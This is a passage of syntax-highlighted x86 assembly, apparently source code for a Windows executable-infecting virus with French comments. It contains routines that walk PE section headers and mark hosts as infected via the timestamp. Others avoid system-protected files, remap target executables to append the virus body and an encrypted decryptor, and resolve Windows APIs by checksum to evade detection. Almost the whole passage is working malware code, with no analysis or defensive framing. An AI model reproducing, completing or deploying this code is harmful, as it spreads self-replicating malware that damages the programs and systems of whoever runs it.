        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">                             </span><span class="sc1">;esi--&gt;sections</span><span class="sc0">
        </span><span class="sc6">movzx</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">+</span><span class="sc2">06h</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc5">cherche_sec2</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">12</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">ja</span><span class="sc0"> </span><span class="sc5">ch4</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">8</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">8</span><span class="sc4">],</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">vsize_ok</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">16</span><span class="sc4">]</span><span class="sc0">           </span><span class="sc1">;raw size</span><span class="sc0">
</span><span class="sc5">vsize_ok</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">ja</span><span class="sc0"> </span><span class="sc5">found2</span><span class="sc0">
</span><span class="sc5">ch4</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc2">28h</span><span class="sc0">
        </span><span class="sc6">loop</span><span class="sc0"> </span><span class="sc5">cherche_sec2</span><span class="sc0">
</span><span class="sc5">found2</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">12</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">20</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">rva2raw</span><span class="sc0"> </span><span class="sc9">endp</span><span class="sc0">


</span><span class="sc1">;SECTION_INFO : in :  eax=rva ,edx--&gt;pe_header</span><span class="sc0">
</span><span class="sc1">;               out : eax--&gt; section header</span><span class="sc0">
</span><span class="sc5">section_info</span><span class="sc0"> </span><span class="sc9">proc</span><span class="sc0"> </span><span class="sc10">near</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc8">edx</span><span class="sc4">+</span><span class="sc2">18h</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">movzx</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">+</span><span class="sc2">14h</span><span class="sc4">]</span><span class="sc0">           </span><span class="sc1">;SizeOfOptionalHeader</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">                             </span><span class="sc1">;esi--&gt;sections</span><span class="sc0">
        </span><span class="sc6">movzx</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">+</span><span class="sc2">06h</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc5">cherche_sec</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">36</span><span class="sc4">],</span><span class="sc5">SECTION_MASK</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">12</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">ja</span><span class="sc0"> </span><span class="sc5">ch3</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">8</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">8</span><span class="sc4">],</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">vsize_ok2</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">16</span><span class="sc4">]</span><span class="sc0">            </span><span class="sc1">; raw size</span><span class="sc0">
</span><span class="sc5">vsize_ok2</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">ja</span><span class="sc0"> </span><span class="sc5">found</span><span class="sc0">
</span><span class="sc5">ch3</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc2">28h</span><span class="sc0">
        </span><span class="sc6">loop</span><span class="sc0"> </span><span class="sc5">cherche_sec</span><span class="sc0">
</span><span class="sc5">found</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">esi</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">section_info</span><span class="sc0"> </span><span class="sc9">endp</span><span class="sc0">

</span><span class="sc1">;CHECK_INFECTION : check si l'hote a déjà été visité</span><span class="sc0">
</span><span class="sc1">; in : edx--&gt; PE header</span><span class="sc0">
</span><span class="sc1">; out : ecx!=0 si deja infecté</span><span class="sc0">
</span><span class="sc5">check_and_set_infection</span><span class="sc0"> </span><span class="sc9">proc</span><span class="sc0"> </span><span class="sc10">near</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,[</span><span class="sc8">edx</span><span class="sc4">+</span><span class="sc2">8</span><span class="sc4">]</span><span class="sc0">     </span><span class="sc1">;timestamp</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ch</span><span class="sc4">,</span><span class="sc5">SIGNATURE_VIRUS</span><span class="sc0">
    </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">deja_infecte</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ch</span><span class="sc4">,</span><span class="sc5">SIGNATURE_VIRUS</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">+</span><span class="sc2">8</span><span class="sc4">],</span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">
</span><span class="sc5">deja_infecte</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">check_and_set_infection</span><span class="sc0"> </span><span class="sc9">endp</span><span class="sc0">

</span><span class="sc1">;IS_SFC : check si sfc protected</span><span class="sc0">
</span><span class="sc1">;in : ebx-&gt;filename</span><span class="sc0">
</span><span class="sc1">;out: ecx!= si sfc protected</span><span class="sc0">
</span><span class="sc5">is_sfc</span><span class="sc0"> </span><span class="sc9">proc</span><span class="sc0"> </span><span class="sc10">near</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Buffer</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc2">260</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
    </span><span class="sc5">call_</span><span class="sc0"> </span><span class="sc5">GetFullPathName</span><span class="sc0">

    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc2">260</span><span class="sc4">*</span><span class="sc2">2</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Buffer2</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Buffer</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc5">call_</span><span class="sc0"> </span><span class="sc5">MultiByteToWideChar</span><span class="sc0">

    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Buffer2</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">sfc_protected</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">is_sfc</span><span class="sc0"> </span><span class="sc9">endp</span><span class="sc0">

</span><span class="sc1">;INFECTION :    in : ebx--&gt; Filename, WFD rempli avec un .exe</span><span class="sc0">
</span><span class="sc1">;               out : none</span><span class="sc0">
</span><span class="sc5">infection</span><span class="sc0"> </span><span class="sc9">proc</span><span class="sc0"> </span><span class="sc10">near</span><span class="sc0">
        </span><span class="sc6">pusha</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">80h</span><span class="sc0">                </span><span class="sc1">;ATTRIB_NORMAL</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
        </span><span class="sc5">call_</span><span class="sc0"> </span><span class="sc5">SetFileAttributes</span><span class="sc0">

</span><span class="sc1">;teste si SFC</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">sfc_protected</span><span class="sc4">],</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">pas_sfc_api</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">is_sfc</span><span class="sc0">
        </span><span class="sc6">test</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">pasbon</span><span class="sc0">
</span><span class="sc5">pas_sfc_api</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">3</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0C0000000h</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
        </span><span class="sc5">call_</span><span class="sc0"> </span><span class="sc5">CreateFile</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">peuxpas</span><span class="sc0">
        </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Fhandle</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">WFD_nFileSizeLow</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">create_mapped_file</span><span class="sc0">
        </span><span class="sc6">test</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">mappas</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Mhandle</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">map_file</span><span class="sc0">                   </span><span class="sc1">; eax=map_offset</span><span class="sc0">
        </span><span class="sc6">test</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">veuxpas</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc8">eax</span><span class="sc4">+</span><span class="sc2">3Ch</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc8">edi</span><span class="sc0">
        </span><span class="sc6">jae</span><span class="sc0"> </span><span class="sc5">pasbon</span><span class="sc0">                      </span><span class="sc1">;si pas PE, evite les violation de pages</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">],</span><span class="sc12">'EP'</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">pasbon</span><span class="sc0">

        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">84h</span><span class="sc4">],</span><span class="sc5">TAILLE_IMPORTS</span><span class="sc4">/</span><span class="sc2">2</span><span class="sc4">+</span><span class="sc5">NB_DLLS_IMPORTEES</span><span class="sc4">*</span><span class="sc2">14h</span><span class="sc0">
        </span><span class="sc6">jae</span><span class="sc0"> </span><span class="sc5">pasbon</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">esi</span><span class="sc0">

        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">check_and_set_infection</span><span class="sc0">
        </span><span class="sc6">test</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">pasbon</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">34h</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">imagebase</span><span class="sc4">],</span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">3Ch</span><span class="sc4">]</span><span class="sc0">                 </span><span class="sc1">;File Alignement</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc5">call_</span><span class="sc0"> </span><span class="sc5">UMVOFile</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Mhandle</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc5">call_</span><span class="sc0"> </span><span class="sc5">CloseHandle</span><span class="sc0">

        </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">virus_len</span><span class="sc4">+</span><span class="sc5">TAILLE_IMPORTS</span><span class="sc4">+</span><span class="sc5">DECRYPTOR_SIZE</span><span class="sc0">       </span><span class="sc1">;edi=fichier+virus</span><span class="sc0">
        </span><span class="sc6">div</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">mul</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">taille_virus_alignee</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">create_mapped_file</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Mhandle</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">map_file</span><span class="sc0">           </span><span class="sc1">; eax=map_offset</span><span class="sc0">

        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">infecte_pe</span><span class="sc0">

</span><span class="sc5">pasbon</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc5">call_</span><span class="sc0"> </span><span class="sc5">UMVOFile</span><span class="sc0">
</span><span class="sc5">veuxpas</span><span class="sc4">:</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Mhandle</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc5">call_</span><span class="sc0"> </span><span class="sc5">CloseHandle</span><span class="sc0">
</span><span class="sc5">mappas</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Fhandle</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc5">call_</span><span class="sc0"> </span><span class="sc5">CloseHandle</span><span class="sc0">
</span><span class="sc5">peuxpas</span><span class="sc4">:</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">WFD_dwFileAttributes</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
        </span><span class="sc5">call_</span><span class="sc0"> </span><span class="sc5">SetFileAttributes</span><span class="sc0">
        </span><span class="sc6">popa</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">infection</span><span class="sc0"> </span><span class="sc9">endp</span><span class="sc0">



</span><span class="sc1">;FIND_APIS: in: esi--&gt; ckecksums(terminé par -1) edi--&gt; apis[] edx=HMODULE*</span><span class="sc0">
</span><span class="sc1">;           out: edi[] rempli</span><span class="sc0">
</span><span class="sc5">find_apis</span><span class="sc0"> </span><span class="sc9">proc</span><span class="sc0"> </span><span class="sc10">near</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,[</span><span class="sc8">edx</span><span class="sc4">+</span><span class="sc2">3ch</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">                     </span><span class="sc1">; ebx--&gt; PE Header</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc2">78h</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">                     </span><span class="sc1">; ecx--&gt; export table</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ecx</span><span class="sc4">+</span><span class="sc2">01ch</span><span class="sc4">]</span><span class="sc0">              </span><span class="sc1">; sauve les adresses des tables</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">lst_fnc</span><span class="sc4">]</span><span class="sc0">           </span><span class="sc1">; liste des adresses de fonctions</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ecx</span><span class="sc4">+</span><span class="sc2">24h</span><span class="sc4">]</span><span class="sc0">               </span><span class="sc1">; liste des ordinals</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,[</span><span class="sc8">ecx</span><span class="sc4">+</span><span class="sc2">20h</span><span class="sc4">]</span><span class="sc0">               </span><span class="sc1">; ebx--&gt;liste des noms</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">
</span><span class="sc5">fa1</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc8">ecx</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">calc_crc</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">esi</span><span class="sc4">]</span><span class="sc0">                   </span><span class="sc1">; est-ce la fonction recherchée ?</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">fa2</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">fa1</span><span class="sc0">
</span><span class="sc5">fa2</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
